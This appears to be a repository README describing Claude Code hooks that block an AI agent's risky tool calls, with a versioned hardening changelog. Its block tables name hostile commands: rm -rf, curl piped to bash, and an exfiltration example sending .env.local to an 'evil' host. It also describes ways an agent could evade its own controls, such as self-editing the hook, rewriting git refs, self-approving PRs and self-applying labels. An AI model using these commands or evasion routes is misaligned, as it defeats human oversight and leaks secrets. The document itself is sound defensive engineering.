# Claude Code Hooks

Project-scoped hooks configured in `.claude/settings.json`. They guard Claude's real-time tool calls before execution — unlike git pre-commit hooks, **the model cannot bypass them** (no `--no-verify` equivalent).

---

## PreToolUse — `pre-tool-use.py`

Runs before every tool call. Exit 2 = block with reason. Exit 0 = allow.

| What it blocks | Tool | Pattern | Why |
|---|---|---|---|
| Edit/Write while on `main`/`master` | Edit/Write | repo branch is protected + file is inside the project | Forces the feature-branch workflow automatically (`docs/COLLABORATION.md`) — keeps `main` clean for collaborators |
| `git commit` while on `main`/`master` | Bash | `git commit` + protected branch | Same — no direct commits to `main` |
| Edit/Write into a **different worktree** | Edit/Write | target's owning worktree (via `git worktree list`) ≠ this session's | A write to another checkout (classically the main checkout, reached via a persisted `cd`) skips every branch guard and lands there **silently** — tests here still pass against the unmodified files. The block message prints the corrected in-worktree path. Fails open; same-worktree writes and paths outside the repo (scratchpad, `~/.claude`, `/tmp`) are unaffected |
| **Edit/Write/NotebookEdit of the hook machinery** | Edit/Write/NotebookEdit | target resolves under `.claude/hooks/**`, or is `.claude/settings.json` / `.claude/settings.local.json` | **GAP 1 (self-edit).** Under `defaultMode: bypassPermissions` this hook *is* the entire local gate; a session that rewrites it to `sys.exit(0)` disables every guard for the rest of the session (command hooks re-read the file per call). These files may only be edited **outside** an agent session |
| **Shell rewrite of the hook machinery** | Bash | redirect into / `sed -i` / `cp`·`mv`·`rm`·`tee` / `git checkout`·`restore`·`reset`·`clean` / any `python`·`node`·`ruby` naming `.claude/hooks/**` or `.claude/settings*.json` **inside this project** | Same as above via the Bash arm. Reads (`cat`, `grep`, `sed -n`) and `git add`/`git commit` are **not** matched, so a session can still stage/commit a hook change authored the right way. Scoped to *this* checkout since v5 — another repo's hooks are not ours |
| **Writing a protected git ref, or repointing `origin`** | Bash, Edit/Write | `git update-ref`·`replace`·`fast-import`·`filter-branch`; `symbolic-ref`/`branch -f`·`-D`·`-M` naming `main`/`master`; a `fetch`/`pull` **refspec** whose destination is a protected ref; `git remote set-url`·`set-head`·`rename`·`remove` on `origin`; `git config remote.origin.url` (writes only); any mutation of `.git/**` — refs, `packed-refs`, `config`, `HEAD`, `logs`, `worktrees` | **Config anchor (TOD-111, from kit PR #39).** Guards deliberately read values from the **committed default branch** rather than the worktree — `delivery.json`, the merged-PR base, the changed-file set a review is judged against — which only means something while the *ref* is not model-writable. One `git update-ref` moves `origin/main` to a commit of the session's own making, and every one of those guards then reads config the session wrote — `dispatch.pinsRoot` included, which is where the **pin** is looked for. Reads (`git log`, `git diff origin/main...HEAD`, `cat .git/config`, `git config --get`) and a plain `git fetch` — the one honest writer of `origin/main` — stay allowed. `.gitignore` and `.github/` are matched component-wise and never caught |
| **Invoking `pipeline_dispatch_local.py`** | Bash | the script named by any command except a read or `--selftest` | It writes the dispatcher **pin**, and a session that can place its own pin can retarget itself at another ticket or widen its own scope fence (`docs/PIPELINE-CONTRACT.md` §3). The script's own agent-environment check is tamper-*evident*, not tamper-proof — same user, same environment — so enforcement lives here. A human runs it from their own terminal |
| **Approving a pull request** | Bash | `gh pr review` with `--approve`, `--approve=true`, `-a`, or a shorthand **cluster** containing `a` (`-ab`); a **bare** `gh pr review` (its event is chosen at an interactive prompt this hook cannot see, so it fails closed); `POST …/pulls/N/reviews` with `event=APPROVE` or an **opaque** `--input` body, in `gh api`, GraphQL (`addPullRequestReview`) and raw `curl` form | **PR self-approval (TOD-111, from kit PR #50).** An approval is not a status bit — it is a claim to the next reader that *somebody else* looked at the work. Measured, not assumed: `main` requires **0** approving reviews, so this is not a merge unlock today; it stops a session's own PR from *reading as reviewed* to Braeden when he merges it by hand, and it is one branch-protection setting away from being an unlock. `--comment` and `--request-changes` stay reachable (neither manufactures a human signal), as do reading reviews and `--add-reviewer`, which *asks* for a review rather than gives one. Distinct from the pipeline's `self-approval` guard below, which refuses a **tracker** move into `ready` |
| **Applying or removing a protected label** | Bash | `hooks-change`, `agent:*`, `blocked:*`, `provenance:*` — via `gh pr/issue edit`·`create`·`new` `--label`/`--add-label`/`--remove-label`/`-l` (including `=` form and comma-separated lists), or a write to `…/issues/N/labels` (including an opaque `--input` body) | **Protected labels (TOD-111, from kit PR #40).** `hooks-change` is what turns CI's **Hooks change guard** green, so a session that can apply it acknowledges its own guard-machinery change — the one thing that gate exists to prevent. `agent:*`/`blocked:*`/`provenance:*` are dispatcher-owned (`docs/PIPELINE-CONTRACT.md` §6); the pipeline's `lifecycle-label` guard already refused them through a **tracker MCP**, but the same write as a `gh` command was unguarded and cheaper. Reading and listing labels is fine, so is labelling with anything outside the protected set, and so is `gh label create` — **defining** a label is setup, not acknowledgement |
| `rm -rf` / `rm --recursive` | Bash | `rm` with recursive+force flags | Accidental mass deletion |
| `curl/wget \| bash` | Bash | pipe to shell | Supply-chain attack vector (inbound) |
| **Outbound exfiltration** | Bash | `curl`/`wget`/`scp`/`sftp`/`nc` to a **non-allowlisted** host *plus* an upload/data flag (`-d`/`--data`/`--post-*`/`-F`/`-T`/`@file`), a `$var`-in-URL, or a raw socket / scp push | **GAP 3 (egress).** Under bypassPermissions `curl -d @.env.local https://evil` runs with no prompt. Allowlist: localhost/loopback, `*.github.com`, `*.githubusercontent.com`, `api.anthropic.com`, `*.supabase.co/.com` (domain-boundary suffix match, so `evil-github.com` is **not** allowed). Plain inbound GETs/downloads stay allowed |
| `git add planning/` | Bash | staging forbidden paths | `planning/` is gitignored reference; leaking it would publish EisenClaw source |
| `git add .env*` (non-example) | Bash | staging real env files | Secrets leak via git |
| Any push naming `main`/`master` | Bash | `git push … main` (refspec or target) | Bypasses PR + CI gate |
| Bare `--force` / `-f` push (any branch) | Bash | force flag without `-with-lease` | Can clobber unseen remote commits; `--force-with-lease` is allowed on feature branches |
| Any Bash command referencing a secret file | Bash | command text matches `.env` (non-`.example`) / `*.pem` / `*.key` / `id_rsa` / `credentials` — **regardless of the leading command** | **GAP 2.** The old verb denylist (`cat`/`less`/`head`/…) let `xxd`/`od`/`strings`/`grep`/`awk`/`base64`/`node -e readFileSync(…)`/`source .env && echo $VAR` slip through. Now the sensitive **path** is matched, not the tool. Property access (`process.env`, `obj.key`) is excluded; `.env.example` is exempt |
| `supabase db reset --linked` / `--db-url <remote>` | Bash | `db reset` + remote flag | Wipes a **production** database — only the local (Docker) reset is allowed |
| `supabase projects delete` | Bash | `projects delete` | Irreversible deletion of a hosted project |
| Remote `DROP`/`TRUNCATE`/`DELETE` SQL | Bash | destructive verb + a non-localhost `postgres://…@host` | Destructive SQL against prod; run it only on the local DB via migrations |

> Bash command-matching is scoped per shell command: the gap between a command
> and its target excludes `;`, `&`, `|`, so a `.env` mentioned in a *later*
> command on the same line (e.g. `cat foo; grep x .env`) is no longer a false
> positive — the real read (`cat .env`) still blocks.

| Reading `.env*` (non-example) | Read | file_path basename match | Same reason — use env var names, not values |
| Reading `*.pem` / `*.key` | Read | file_path suffix | Private key material |
| Writing to `.env*` (non-example) | Edit/Write | file_path basename match | Only `.env.example` is committed |
| Embedding secret values | Edit/Write | regex patterns for `sk-ant-`, DB URLs with passwords, private key blocks, AWS keys, GitHub tokens, raw JWTs | Secrets must never appear in committed files |

> **v2 (2026-07-03) — guards match operations, not prose.** Quoted payloads of
> `-m/--message/--title/--body/-t/-b` are stripped before the danger patterns run, so a
> `git commit -m "drop stale rows"` or a PR body that *describes* `rm -rf` no longer
> false-positives (v1 blocked these). Message text is inert prose — it is never executed —
> so stripping it loses no protection; every real operation string still hits the scanners.
> `git commit -F <file>` / `--body-file` remain the norm for long text. Also in v2: the push
> guard is branch-scoped — `--force-with-lease` is allowed on feature branches; anything
> naming `main`/`master`, and bare `--force`/`-f` anywhere, still block. Verified by an
> 18-case block/allow battery (see PR).

> **v3 (2026-07-06) — local-containment hardening (audit).** `settings.json` sets
> `defaultMode: bypassPermissions`, so this hook is the *entire* local runtime gate — the
> audit closed four gaps in it. **GAP 1:** the hook was self-editable; now Edit/Write/NotebookEdit
> and shell rewrites of `.claude/hooks/**` + `.claude/settings*.json` are blocked (edit those
> outside a session), and a CI job (`.github/workflows/ci.yml` → **Hooks change guard**) fails any
> PR touching them without a `hooks-change` label. **GAP 2:** the secret-read guard became a
> path-target match instead of a verb denylist. **GAP 3:** a new egress guard blocks obvious
> outbound exfil. **GAP 4 — split error posture:** the security checks run inside a fail-**closed**
> boundary (an exception → *block*, exit 2), because Claude Code treats a non-2 exit (an uncaught
> crash → exit 1) as *non-blocking* and would run the tool. The git/gh/network **workflow** guards
> (branch, merged-PR, cross-worktree) each swallow their own errors and stay fail-**open**. Verified
> by an 89-case block/allow battery (see PR).

> **v4 (2026-07-21) — rm-guard flag anchoring; block reasons to stderr.** The
> `-r…f` / `-f…r` short-flag patterns now require the letter run to START an
> argument token (whitespace or an opening quote before the dash). Unanchored,
> they also matched interior dashes in FILENAMES, so plain `rm` of a dashed file
> false-blocked: `rm src/test/probe-future-date.ts` (`-futur` ~ `-f…r`),
> `rm build-for-prod.txt` (`-for`). Real spellings (`rm -rf`, `-fr`, `-irf`,
> quoted `'-rf'`, `--recursive`) still block. Also `block()` now prints its
> reason to **stderr**: for a blocking exit 2 Claude Code relays stderr and
> ignores stdout, so every denial had been surfacing to the model as
> "PreToolUse:… hook error: … No stderr output" with the reason lost. Verified
> by a 25-case block/allow battery (see PR).

> **v5 (2026-08-25) — the pipeline guard layer, plus three false-positive fixes.**
> Adds the six pipeline-scoped guards below and fixes three ways the existing
> guards matched *mentions* rather than *operations*. **(1) `sed` as a rewrite:**
> `sed`/`perl` now require an in-place flag, so `sed -n '1,70p' <hook>` — a read —
> no longer blocks; and the Bash arm is **scoped to this checkout**, so reading or
> editing *another* repo's `.claude/hooks/**` (a scratch clone) is no longer
> treated as self-edit. A *relative* path stays protected regardless of where it
> resolves, so `../../.claude/hooks/x` is not an escape. **(2) Prose scanning:**
> `_strip_prose` moved to module scope and now runs at **four** scanning sites
> instead of one — a PR body or commit message quoting `.env.local` (or the words
> `git commit`) no longer trips the secret-file or branch guards. `--body-file`,
> `--notes` and `-F` joined the stripped-flag list. Known limit, stated plainly: a
> **heredoc** body is *not* stripped, because doing so generally would blind the
> guard to `bash <<'EOF' … rm -rf / … EOF`; pass long text with `--body-file`.
> **(3) Local dispatch:** invoking `scripts/pipeline_dispatch_local.py` is now
> blocked outright (see the table). Verified by a 245-case battery
> (`npm run test:hooks`), of which 95 are new.

> **v6 (2026-08-26) — three guards ported down from the kit (TOD-111).** The kit's
> hook had grown three guards this one never received; all three are the same
> defect class — *an agent producing a signal a human is meant to produce* — and all
> three are in the table above. **(1) Config anchor** (kit PR #39). This repo
> already read `delivery.json` from the committed default branch and already failed
> closed on an *expired* pin while failing open on an *absent* one; what was missing
> is the half that makes those two properties mean anything — nothing stopped a
> session from **moving the ref they rest on**. The git ref store is now human-only,
> the same way the hook files are. **(2) Protected labels** (kit PR #40) — flagged
> as a known gap in #397's own PR body, which noted that this repo's stricter
> whole-directory self-protection buys less than it looks like it does without the
> guard the kit compensates with. **(3) PR self-approval** (kit PR #50 / KIT-21).
> Ported from the kit rather than rewritten, so the next `/sync-kit` diff is clean.
> Verified by a 330-case battery (`npm run test:hooks`), of which **70 are new**.
> Of those 70, the **40** that assert a *block* (34 block cases + 6 stderr-reason
> cases) all fail against the pre-change hook; the other 30 assert an *allow* and
> therefore cannot fail before the guard exists — they exist to pin the carve-outs
> (`git fetch`, `--comment` reviews, unrelated labels, `.gitignore`/`.github/`).
> All 260 pre-existing cases still pass. Separately, 30 commands copied out of
> `CLAUDE.md` and `docs/COLLABORATION.md` were probed against both the old and new
> hook: 30/30 allowed by both, so the branch workflow gains no false positive.

### Pipeline guards (v5) — optional, off unless `delivery.json` exists

Six guards from `docs/PIPELINE-CONTRACT.md`. They are **inert** unless
`delivery.json` is present at the repo root — the contract's single discriminator
(§2). *Off* is not *broken*: the existence test runs before anything that can
fail, so a project that never opted in behaves exactly as it did before. A
fail-closed guard whose precondition is missing would block every `Edit`/`Write`,
and because this file is self-protected the agent could not repair it.

| Guard | Active when | Enforces |
|---|---|---|
| `pin-binding` | configured **and** `session_mode: ticket` | A valid, unexpired pin exists and its `worktree` matches the derived session root |
| `ticket-branch` | configured **and** `branch.requireTicketId` | The branch carries the pinned ticket ID, lower-cased |
| `scope-fence` | configured **and** pinned | No writes to `autonomy.riskPaths` (CI workflows, `delivery.json`, hook machinery) — a session must not edit what grades it |
| `lifecycle-label` | configured **and** pinned | The session does not set or clear its own `agent:*` / `blocked:*` labels |
| `self-approval` | configured | The session never moves a ticket into `ready`. Unconditional — there is no in-session allow-path and no config value that opens one |
| `telemetry-required` | configured | **Partial here.** See the note below |

**Where authority comes from.** Config *values* are read from the **committed
copy on the default branch**, never the working tree — the working-tree copy sits
inside the agent's own worktree, so trusting it would let a session raise its own
budgets or blank the state ID a guard matches on. The pin is read from
**outside** the worktree at `<pinsRoot>/<sha256(session root)[:16]>.json`. Neither
the branch name, a PR body, nor an environment variable is authority for any of
it.

**Fail direction.** Write-blocking guards fail **closed** — including on an
*expired* pin in ticket mode, because a lapsed binding is broken (unlike one never
claimed) and otherwise simply *waiting* would be an escape. Checks that merely
*withhold* autonomy from an unpinned session fail **open**, so a human working ad
hoc in a configured repo is never bricked.

> **`telemetry-required` is only half-enforced here, deliberately.** Its counting
> half — "a terminal run posts exactly one valid telemetry block" — belongs to the
> §8 safe-outputs validator, which runs *out of session* and is **not ported to
> this repo**: there is no requests-file emitter here yet. A PreToolUse hook
> cannot observe "the turn ended without telemetry", and a fail-closed Stop-time
> guard with no way to emit would brick every session. What the hook *does*
> guarantee is that the reporting **channel** stays open — a comment on the pinned
> ticket, including one whose target it cannot resolve, is never blocked — and
> that it cannot be redirected at another ticket. Pinned by five battery cases.

---

## PostToolUse — `audit.py`

Runs after every `Bash`, `Edit`, and `Write` call. Appends a one-line timestamped record to `.claude/audit.log` (gitignored — local only). Format:

```
2026-06-22T14:03:11Z [Bash] npm install husky --save-dev
2026-06-22T14:03:15Z [Write] /Users/.../todoclaw/.gitignore — write
```

Use this to review what Claude did in a session, especially before a commit.

---

## Stop — `stop-pr-check.py`

Runs when Claude tries to end a turn. Blocks (with a reason Claude must address) on a **pushed** branch that is ahead of the mainline when any of these hold — so "open a PR and watch CI to green" isn't just a written rule that gets skipped across parallel sessions:

| Blocks ending the turn when | Why |
|---|---|
| The branch has **no PR** yet | CLAUDE.md expects a PR once a task is done (`gh pr create`) |
| The open PR has **failing CI** (`FAILURE`/`CANCELLED`/`TIMED_OUT`/…) that Claude could actually fix | CI must be watched to green before a task is "done". Checks that are red *pending a human* are exempt — see below |
| The open PR is **`DIRTY`** (merge conflicts) | GitHub can't build the merge ref, so the required CI (Lint/Typecheck/Test/E2E) **never runs** — only side checks (CodeQL/Vercel) report and can look green. A conflicted PR must be rebased, not mistaken for passing (2026-07-03 near-miss). Fires only on explicit `DIRTY`, never the transient `UNKNOWN` right after a push |

**The mainline is `origin/main`, not local `main`.** The base is resolved through `origin/main` → `origin/master` → `main` → `master`. In normal PR flow you branch off `origin/main` and never update local `main`, so local `main` is usually stale and comparing against it makes a branch with nothing new look "ahead of main" — a false nag on every dispatched session, whose clone freezes local `main` at clone time (TOD-118).

**Red *pending a human* is not a defect.** `HUMAN_PENDING_CHECKS` exempts checks no code change can clear — today only CI's **Hooks change guard**, which stays red until a person applies the `hooks-change` label. Without the exemption that guard and this nag deadlock each other: the session cannot end its turn, and its only self-clear would be applying its own acknowledgement label, which the PreToolUse protected-label guard forbids outright. Keep the set tiny — a check that can fail for a second reason does not belong in it. A genuine failure *alongside* a pending one still blocks; the pending check is only named in the message.

Fires once per `(branch, HEAD commit, reason)` — deduped in `.claude/.stop-pr-nag/` (gitignored) — so explaining instead of acting can't trap the session in a loop. Fails open on any `git`/`gh`/network error (never blocks on what it can't verify).

---

## Defense in depth

These hooks are **layer 1** of three:
1. **Claude Code hooks** (this) — guard Claude's actions; model cannot bypass in-session. But under `bypassPermissions` this hook is the *only* local gate, so its own files are protected (GAP 1) and its security checks fail closed (GAP 4).
2. **Git pre-commit hooks** (Husky + secretlint) — guard commit contents locally; bypassable via `--no-verify`.
3. **CI + branch protection** — the unbypassable gate on every PR; runs secretlint + forbidden-paths + the **Hooks change guard** (a PR that edits `.claude/hooks/**`, `.claude/settings.json` or `scripts/gh_fallback.py` must carry a `hooks-change` label). Branch protection's `required_approving_review_count` (owner-set, GitHub UI) is the human backstop that makes the CI flag meaningful.
